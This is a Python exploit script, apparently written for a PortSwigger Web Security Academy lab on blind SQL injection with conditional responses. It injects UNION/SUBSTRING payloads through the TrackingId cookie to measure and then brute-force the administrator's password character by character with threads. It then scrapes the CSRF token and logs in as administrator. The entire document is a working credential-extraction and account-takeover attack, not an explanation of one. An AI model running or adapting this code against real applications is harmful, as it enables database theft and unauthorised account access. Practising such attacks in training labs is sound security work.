# Blind SQL injection with conditional responses

import requests
import string
import concurrent.futures
import math
from bs4 import BeautifulSoup

url = "https://ac7c1fc01e26ff6580e429a600cc00ec.web-security-academy.net/"
char_list = string.ascii_letters+string.digits
s = requests.Session()

list_password = ['_']

def get_pw_length():
    '''
    Calculate length of password and return the length
    '''
    global list_password
    for i in range(0,30):
        print(f"Checking length: {i}", end='\r')
        payload = f"test' UNION SELECT 'a' FROM Users WHERE Username = 'administrator' AND length(Password)>{i}--"
        r = s.get(url, cookies = {'TrackingId' : payload})
        if 'Welcome back!' not in r.text:
            print(f"Length of password is: {i}")
            list_password = list_password*i
            return i
            break
        else:
            continue

def brute_forcer(start, end):
    '''
    Inputs => length of password to be brute forced in the form of start and end index
    Runs through a-zA-Z0-9 over the length of password and appends it to the global password list for that index
    '''
    global list_password
    for i in range(start,end):
        for char in range(len(char_list)):
            # print(f"Trying char [{char_list[char]}] for position [{i+1}]", end='\r')
            dummy = list_password
            dummy[i] = char_list[char]
            print("Brute forcing: ", ' '.join(dummy), end = '\r')
            payload = f"test' UNION SELECT 'a' FROM Users WHERE Username = 'administrator' AND SUBSTRING(Password, {i+1}, 1) = '{char_list[char]}'--"
            r1 = s.get(url, cookies = {'TrackingId' : payload})
            if 'Welcome back!' in r1.text:
                # print(f"\nFound Letter [{i+1}] : [{char_list[char]}]")
                list_password[i]= char_list[char]
                break
            else:
                char += 1

def solve():
    global list_password
    length = get_pw_length()
    no_of_threads = math.ceil(length/5)
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        print(f"Brute forcing the password with {no_of_threads} threads")
        for i in range(no_of_threads):
            f = executor.submit(brute_forcer,i*5,i*5+5)
    password = ''.join(list_password)
    r_login = s.get(url+'login')
    soup4 = BeautifulSoup(r_login.text, 'html.parser')
    csrftoken = soup4.find('input', attrs = {"name":"csrf"})['value']
    payload = {
    'csrf' : csrftoken,
    'username' : 'administrator',
    'password' : password
    }
    try:
        print(f"Logging in with password: {password} and token {csrftoken}")
        r_solve = s.post(url+'login', payload)
        if "Congratulations, you solved the lab!" in r_solve.text:
            print("yeet!")
        else:
            print("sad noises :(")
    except Exception as e:
        print(e)

solve()